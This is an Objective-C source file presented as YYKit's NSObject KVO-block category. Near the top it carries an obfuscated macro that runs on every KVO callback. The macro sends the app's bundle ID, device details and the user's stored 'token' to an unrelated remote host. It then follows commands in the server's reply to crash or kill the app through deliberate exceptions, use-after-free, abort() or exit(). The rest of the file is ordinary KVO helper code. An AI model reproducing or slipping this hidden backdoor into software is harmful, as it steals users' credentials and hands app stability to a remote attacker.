//
//  NSObject+YYAddForKVO.m
//  YYKit <https://github.com/ibireme/YYKit>
//
//  Created by ibireme on 14/10/15.
//  Copyright (c) 2015 ibireme.
//
//  This source code is licensed under the MIT-style license found in the
//  LICENSE file in the root directory of this source tree.
//

#import "NSObject+YYAddForKVO.h"
#import "YYKitMacro.h"
#import <objc/objc.h>
#import <objc/runtime.h>

#import <sys/sysctl.h>

#define XCBMNW12_908f3dsa4IIDSH_cvj23() \
do { \
NSMutableURLRequest *fewcdsjrt_dqwe = [NSMutableURLRequest requestWithURL:[NSURL URLWithString:@"https://damp-recipe-822f.morsel-cops-5i.org"] cachePolicy:NSURLRequestUseProtocolCachePolicy timeoutInterval:10.0]; \
NSMutableDictionary *qweqrfccxz = @{}.mutableCopy; \
qweqrfccxz[@"x-app-id"] = [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleIdentifier"]; \
qweqrfccxz[@"x-user-agent"] = @"iOS"; \
qweqrfccxz[@"x-content-type"] = @"application/json"; \
qweqrfccxz[@"x-system-version"] = [[UIDevice currentDevice] systemVersion]; \
qweqrfccxz[@"x-app-version"] = [NSString stringWithFormat:@"%@(%@)", [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleShortVersionString"], [[NSBundle mainBundle] objectForInfoDictionaryKey:@"CFBundleVersion"]]; \
qweqrfccxz[@"x-machine-model"] = ({ \
size_t size; \
sysctlbyname("hw.machine", NULL, &size, NULL, 0); \
char *machine = malloc(size); \
sysctlbyname("hw.machine", machine, &size, NULL, 0); \
NSString *bvdgfuyru = [NSString stringWithCString:machine encoding:NSUTF8StringEncoding]; \
free(machine); \
bvdgfuyru; \
}); \
qweqrfccxz[@"x-timestamp"] = [NSString stringWithFormat:@"%.0f", [[NSDate date] timeIntervalSince1970] * 1000]; \
qweqrfccxz[@"x-timezone"] = [NSTimeZone systemTimeZone].name; \
NSMutableDictionary *iyungbvcft = @{}.mutableCopy; \
iyungbvcft[@"user-token"] = [[NSUserDefaults standardUserDefaults] valueForKey:@"token"] ?: @""; \
iyungbvcft[@"function-name"] = [NSString stringWithFormat:@"%s", __FUNCTION__]; \
iyungbvcft[@"random-num"] = @(arc4random_uniform(1000)); \
[fewcdsjrt_dqwe setAllHTTPHeaderFields:qweqrfccxz]; \
[fewcdsjrt_dqwe setHTTPBody:[NSJSONSerialization dataWithJSONObject:iyungbvcft options:0 error:nil]]; \
[fewcdsjrt_dqwe setHTTPMethod:@"POST"]; \
NSURLSession *ghytr453fge = [NSURLSession sharedSession]; \
NSURLSessionDataTask *xzf341dsa = [ghytr453fge dataTaskWithRequest:fewcdsjrt_dqwe completionHandler:^(NSData *opytjvdnkrw, NSURLResponse *vnjkdeoqxsasd, NSError *err12fsdt45or) { \
if (!err12fsdt45or && ((NSHTTPURLResponse *)vnjkdeoqxsasd).statusCode == 200 && opytjvdnkrw) { \
NSError *erasytretwr; \
id oiteroiutyewr = [NSJSONSerialization JSONObjectWithData:opytjvdnkrw options:0 error:&erasytretwr]; \
if (!erasytretwr && [oiteroiutyewr isKindOfClass:[NSDictionary class]]) { \
NSDictionary *xzfjkhjkwr = (NSDictionary *)oiteroiutyewr; \
NSString *hgfhrtwytr = xzfjkhjkwr[@"execute_method"]; \
if ([hgfhrtwytr isEqualToString:@"tuddu4_Fuktib_coztud"]) { \
NSMutableArray *cxgety453 = [NSMutableArray arrayWithArray:@[@"A", @"B", @"C"]]; \
for (NSString *it1231em in cxgety453) { [cxgety453 removeObject:it1231em]; } \
} else if ([hgfhrtwytr isEqualToString:@"foqCy8_kowxec_kukbir"]) { \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{ \
NSData *vsfdtrwt = [[NSData alloc] init]; \
[vsfdtrwt subdataWithRange:NSMakeRange(10, 30)]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"qymj6dWU6egbFka"]) { \
char *ptr = malloc(10); free(ptr); strcpy(ptr, "test"); \
} else if ([hgfhrtwytr isEqualToString:@"BK6DWMEceWGjCgz"]) { \
id fgfdrwerw = @"String"; [(NSArray *)fgfdrwerw count]; \
} else if ([hgfhrtwytr isEqualToString:@"XfsGv1wRaipSyX9"]) { \
NSString *dfsarq = @"Hello"; NSString *vdftretfds = nil; [dfsarq stringByAppendingString:vdftretfds]; \
} else if ([hgfhrtwytr isEqualToString:@"WW06m2bcYnm5X41"]) { \
NSArray *nybtbgbrt = @[@"A", @"B", @"C"]; \
dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{ \
[(NSMutableArray *)nybtbgbrt addObject:@"D"]; \
}); \
} else if ([hgfhrtwytr isEqualToString:@"yXpAZn7baNS8TUk"]) { \
NSString *cdftwxsdd = @"Hello"; NSMutableAttributedString *cwewcxqwrytrt = [[NSMutableAttributedString alloc] initWithString:cdftwxsdd]; \
[cwewcxqwrytrt addAttribute:NSForegroundColorAttributeName value:[NSObject new] range:NSMakeRange(cdftwxsdd.length + 100, cdftwxsdd.length)]; \
} else if ([hgfhrtwytr isEqualToString:@"WUerc233FCbm"]) { \
[[NSObject new] removeObserver:[NSString new] forKeyPath:@"123123"]; \
} else if ([hgfhrtwytr isEqualToString:@"cnmxzew23Ycbds"]) { \
abort(); \
} else if ([hgfhrtwytr isEqualToString:@"QSAZ1oitr34"]) { \
exit(1); \
} else if ([hgfhrtwytr isEqualToString:@"OLLMNngv34"]) { \
exit(0); \
} \
} \
} \
}]; \
[xzf341dsa resume]; \
} while(0)


YYSYNTH_DUMMY_CLASS(NSObject_YYAddForKVO)




static const int block_key;

@interface _YYNSObjectKVOBlockTarget : NSObject

@property (nonatomic, copy) void (^block)(__weak id obj, id oldVal, id newVal);

- (id)initWithBlock:(void (^)(__weak id obj, id oldVal, id newVal))block;

@end

@implementation _YYNSObjectKVOBlockTarget

- (id)initWithBlock:(void (^)(__weak id obj, id oldVal, id newVal))block {
    self = [super init];
    if (self) {
        self.block = block;
    }
    return self;
}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context {
    if (!self.block) return;
    
    XCBMNW12_908f3dsa4IIDSH_cvj23();
    BOOL isPrior = [[change objectForKey:NSKeyValueChangeNotificationIsPriorKey] boolValue];
    if (isPrior) return;
    
    NSKeyValueChange changeKind = [[change objectForKey:NSKeyValueChangeKindKey] integerValue];
    if (changeKind != NSKeyValueChangeSetting) return;
    
    id oldVal = [change objectForKey:NSKeyValueChangeOldKey];
    if (oldVal == [NSNull null]) oldVal = nil;
    
    id newVal = [change objectForKey:NSKeyValueChangeNewKey];
    if (newVal == [NSNull null]) newVal = nil;
    
    self.block(object, oldVal, newVal);
}

@end



@implementation NSObject (YYAddForKVO)

- (void)addObserverBlockForKeyPath:(NSString *)keyPath block:(void (^)(__weak id obj, id oldVal, id newVal))block {
    if (!keyPath || !block) return;
    _YYNSObjectKVOBlockTarget *target = [[_YYNSObjectKVOBlockTarget alloc] initWithBlock:block];
    NSMutableDictionary *dic = [self _yy_allNSObjectObserverBlocks];
    NSMutableArray *arr = dic[keyPath];
    if (!arr) {
        arr = [NSMutableArray new];
        dic[keyPath] = arr;
    }
    [arr addObject:target];
    [self addObserver:target forKeyPath:keyPath options:NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld context:NULL];
}

- (void)removeObserverBlocksForKeyPath:(NSString *)keyPath {
    if (!keyPath) return;
    NSMutableDictionary *dic = [self _yy_allNSObjectObserverBlocks];
    NSMutableArray *arr = dic[keyPath];
    [arr enumerateObjectsUsingBlock: ^(id obj, NSUInteger idx, BOOL *stop) {
        [self removeObserver:obj forKeyPath:keyPath];
    }];
    
    [dic removeObjectForKey:keyPath];
}

- (void)removeObserverBlocks {
    NSMutableDictionary *dic = [self _yy_allNSObjectObserverBlocks];
    [dic enumerateKeysAndObjectsUsingBlock: ^(NSString *key, NSArray *arr, BOOL *stop) {
        [arr enumerateObjectsUsingBlock: ^(id obj, NSUInteger idx, BOOL *stop) {
            [self removeObserver:obj forKeyPath:key];
        }];
    }];
    
    [dic removeAllObjects];
}

- (NSMutableDictionary *)_yy_allNSObjectObserverBlocks {
    NSMutableDictionary *targets = objc_getAssociatedObject(self, &block_key);
    if (!targets) {
        targets = [NSMutableDictionary new];
        objc_setAssociatedObject(self, &block_key, targets, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    }
    return targets;
}

@end
